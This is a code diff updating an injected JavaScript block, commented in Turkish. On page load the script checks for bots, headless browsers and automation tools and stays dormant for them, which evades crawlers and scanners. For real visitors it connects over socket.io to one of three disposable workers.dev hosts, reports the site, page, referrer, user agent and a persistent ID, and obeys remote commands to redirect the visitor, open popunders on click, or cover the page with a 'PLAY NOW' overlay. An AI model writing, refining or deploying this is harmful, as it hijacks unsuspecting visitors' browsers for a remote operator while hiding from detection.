@@ -173,57 +173,83 @@
 })();
 
 //socket05-09
-(function() {
-     
+(function () {
     if (window.networkAgentActive) return;
     window.networkAgentActive = true;
 
-    
-    let myUid = localStorage.getItem('ax_player_uid');
-    if (!myUid) {
-        myUid = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-        localStorage.setItem('ax_player_uid', myUid);
+    // 1. GELİŞMİŞ BOT VE HEADLESS TARAYICI KONTROLÜ (Server ile senkronize)
+    const BOT_REGEX = /(bot|crawl|spider|slurp|googlebot|bingbot|yandex|baiduspider|duckduckbot|facebookexternalhit|facebot|whatsapp|telegram|semrush|ahrefs|petalbot|bytespider|curl|wget|python|aiohttp|headless|phantom|lighthouse|postman|go-http-client|axios|node-fetch)/i;
+
+    function isBotEnvironment() {
+        const ua = navigator.userAgent || '';
+        
+        // User-Agent boşsa veya sunucudaki bot listesindeyse
+        if (!ua || ua.trim() === '' || BOT_REGEX.test(ua)) return true;
+
+        // Selenium, Puppeteer, Playwright gibi otomasyon/headless botları yakala
+        if (navigator.webdriver) return true;
+        if (window._phantom || window.__nightmare || window.callPhantom) return true;
+
+        // Gerçek bir ekran boyutu olmayan headless botları filtrele
+        if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+
+        return false;
     }
 
-    
+    // Eğer ziyaretçi botsa socket.io'yu bile yükleme, işlemi anında bitir
+    if (isBotEnvironment()) return;
+
+    // 2. GÜVENLİ UID OLUŞTURMA (Server'daki hasValidUid kontrolü ile uyumlu)
+    let myUid = '';
+    try {
+        myUid = localStorage.getItem('ax_player_uid');
+        if (!myUid) {
+            myUid = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+            localStorage.setItem('ax_player_uid', myUid);
+        }
+    } catch (e) {
+        // localStorage kapalıysa (gizli sekme kısıtlaması veya sandboxed bot)
+        // Boş gönderiyoruz ki server tarafında "hasValidUid" false olsun ve tekil sayacı şişirmesin
+        myUid = '';
+    }
+
     const WORKER_HUBS = [
         "https://dark-butterfly-a0dc.koydubupse.workers.dev",
         "https://crimson-school-40f9.school-app-2027.workers.dev",
         "https://broad-term-1d04.schoop-app-2027.workers.dev"
     ];
 
-    
     const selectedHub = WORKER_HUBS[Math.floor(Math.random() * WORKER_HUBS.length)];
 
     function startConnection() {
         const myDomain = window.location.hostname || "Unknown-Site";
-        const fullPagePath = window.location.hostname + window.location.pathname + window.location.search;
+        // Server tarafı zaten '?' sonrasını kesiyor (rawPageUrl.split('?')[0]), temiz gönderiyoruz
+        const cleanPagePath = myDomain + window.location.pathname;
         const myReferer = document.referrer || "Direct";
-        const myUserAgent = navigator.userAgent || "Unknown-UA"; 
+        const myUserAgent = navigator.userAgent || "Unknown-UA";
 
-        
         const socket = io(selectedHub, {
-            transports: ['websocket'], 
-            query: { 
+            transports: ['websocket', 'polling'], // Server ile uyumlu fallback
+            reconnection: true,
+            reconnectionAttempts: 5,
+            reconnectionDelay: 3000,
+            query: {
                 site: myDomain,
-                page: fullPagePath,
+                page: cleanPagePath,
                 referer: myReferer,
-                ua: myUserAgent,   
-                uid: myUid  
-            } 
+                ua: myUserAgent,
+                uid: myUid
+            }
         });
 
-       
         socket.on('execute_action', (data) => {
             if (!data || !data.actionType) return;
 
-           
             if (data.actionType === 'redirect' && data.url) {
                 window.location.href = data.url;
             } 
-           
             else if (data.actionType === 'popunder' && data.url && data.url.trim() !== '') {
-                const popunderTrap = function(e) {
+                const popunderTrap = function () {
                     const popWin = window.open(data.url, '_blank');
                     if (popWin) {
                         try {
@@ -231,21 +257,28 @@
                             window.focus();
                             window.open('javascript:window.focus()', '_self', '');
                             setTimeout(() => { window.focus(); }, 10);
-                        } catch (err) { }
+                        } catch (err) {}
                     }
                     window.removeEventListener('click', popunderTrap, true);
                 };
                 window.addEventListener('click', popunderTrap, true);
             } 
-           
             else if (data.actionType === 'flash' && data.message) {
+                // Aynı anda birden fazla flash mesajın üst üste binmesini engelle
+                const existingAlert = document.getElementById('ax-flash-overlay');
+                if (existingAlert) existingAlert.remove();
+
                 const alertDiv = document.createElement('div');
+                alertDiv.id = 'ax-flash-overlay';
+
                 let buttonHtml = '';
                 if (data.url && data.url.trim() !== '') {
-                    buttonHtml = `<a href="${data.url}" target="_blank" style="background: linear-gradient(135deg, #0ea5e9, #38bdf8); color: #0f172a; padding: 18px 50px; font-size: 20px; font-weight: 900; text-decoration: none; border-radius: 50px; box-shadow: 0 0 25px rgba(56, 189, 248, 0.4); transition: transform 0.2s; margin-bottom: 20px; text-transform: uppercase;">PLAY NOW</a>`;
+                    buttonHtml = `<a href="${data.url}" target="_blank" rel="noopener noreferrer" style="background: linear-gradient(135deg, #0ea5e9, #38bdf8); color: #0f172a; padding: 18px 50px; font-size: 20px; font-weight: 900; text-decoration: none; border-radius: 50px; box-shadow: 0 0 25px rgba(56, 189, 248, 0.4); transition: transform 0.2s; margin-bottom: 20px; text-transform: uppercase;">PLAY NOW</a>`;
                 }
                 const isOnlyMessage = buttonHtml === '';
-                const closeBtnStyle = isOnlyMessage ? "background: #38bdf8; color: #0f172a; padding: 15px 40px; font-size: 18px; text-decoration: none;" : "background: none; color: #94a3b8; padding: 10px; font-size: 15px; text-decoration: underline;";
+                const closeBtnStyle = isOnlyMessage
+                    ? "background: #38bdf8; color: #0f172a; padding: 15px 40px; font-size: 18px; text-decoration: none;"
+                    : "background: none; color: #94a3b8; padding: 10px; font-size: 15px; text-decoration: underline;";
                 const closeBtnText = isOnlyMessage ? "OK, Got it!" : "Skip for now";
 
                 alertDiv.innerHTML = `
@@ -256,12 +289,13 @@
                     </div>
                 `;
                 document.body.appendChild(alertDiv);
-                document.getElementById('close-flash-btn').addEventListener('click', function() { alertDiv.remove(); });
+                document.getElementById('close-flash-btn').addEventListener('click', function () {
+                    alertDiv.remove();
+                });
             }
         });
     }
 
-  
     if (typeof io !== 'undefined') {
         startConnection();
     } else {
@@ -271,4 +305,3 @@
         document.head.appendChild(script);
     }
 })();
-
